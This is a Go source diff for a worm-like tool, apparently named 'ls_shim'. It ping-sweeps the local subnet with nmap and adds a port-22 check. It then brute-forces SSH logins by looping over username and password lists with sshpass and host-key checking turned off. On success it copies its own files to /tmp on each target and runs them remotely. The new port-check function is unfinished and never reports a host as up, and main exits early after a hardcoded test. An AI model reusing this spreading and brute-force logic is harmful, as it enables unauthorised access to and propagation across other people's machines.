@@ -19,6 +19,8 @@ var passwords []string
 var installedIPs []string
 
 func main() {
+	fmt.Println(sshUp("192.168.10.2"))
+	return
 	if isVerbose {
 		fmt.Println("OS is: " + systemOS)
 	}
@@ -72,37 +74,57 @@ func runRemote(username, password, ip string) {
 	}
 }
 
+func sshUp(ip string) bool {
+	cmd := exec.Command("nmap", ip, "-p", "22", "-oG", ".nmapscan-"+ip)
+	cmd.Run()
+	res := strings.Split(readFile(".nmapscan-"+ip), "\n")
+	isUp := false
+	for i := 0; i < len(res); i++ {
+		if strings.Index(res[i], "Ports: 22") != -1 {
+			str := res[i][strings.Index(res[i], "/"):]
+			str = strings.Replace(res[i], "/", "!", 1)
+			fmt.Println(str)
+		}
+	}
+	return isUp
+}
+
 func transferFiles(ips []string) {
 	for i := 0; i < len(ips); i++ {
 		if isVerbose {
-			fmt.Println("Transferring files to " + ips[i])
+			fmt.Println("Scanning port 22 on " + ips[i])
 		}
-		for u := 0; u < len(usernames); u++ {
+		if sshUp(ips[i]) {
 			if isVerbose {
-				fmt.Println("Trying user " + usernames[u])
+				fmt.Println("Transferring files to " + ips[i])
 			}
-			complete := false
-			for p := 0; p < len(passwords); p++ {
+			for u := 0; u < len(usernames); u++ {
 				if isVerbose {
-					command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ips[i] + ":/tmp/"}
-					fmt.Println(command)
+					fmt.Println("Trying user " + usernames[u])
 				}
-				cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ips[i]+":/tmp/")
-				err := cmd.Run()
-				if err == nil {
+				complete := false
+				for p := 0; p < len(passwords); p++ {
 					if isVerbose {
-						fmt.Println("Files sent")
-						runRemote(usernames[u], passwords[p], ips[i])
+						command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ips[i] + ":/tmp/"}
+						fmt.Println(command)
 					}
-					complete = true
-					break
+					cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ips[i]+":/tmp/")
+					err := cmd.Run()
+					if err == nil {
+						if isVerbose {
+							fmt.Println("Files sent")
+							runRemote(usernames[u], passwords[p], ips[i])
+						}
+						complete = true
+						break
+					}
 				}
-			}
-			if complete {
-				break
-			} else {
-				if isVerbose {
-					fmt.Println("User" + usernames[u] + " failed. Trying next user...")
+				if complete {
+					break
+				} else {
+					if isVerbose {
+						fmt.Println("User " + usernames[u] + " failed. Trying next user...")
+					}
 				}
 			}
 		}
@@ -119,8 +141,7 @@ func findIPs() []string {
 	fmt.Println(ipRange)
 	cmd := exec.Command("nmap", "-sn", ipRange, "-oG", ".ipscan_lsshim")
 	cmd.Run()
-	ipFile, _ := os.ReadFile(".ipscan_lsshim")
-	ipStr := string(ipFile)
+	ipStr := readFile(".ipscan_lsshim")
 	ipArr := strings.Split(ipStr, "\n")
 	for i := 0; i < len(ipArr); i++ {
 		if strings.Index(ipArr[i], "Host: ") != -1 {
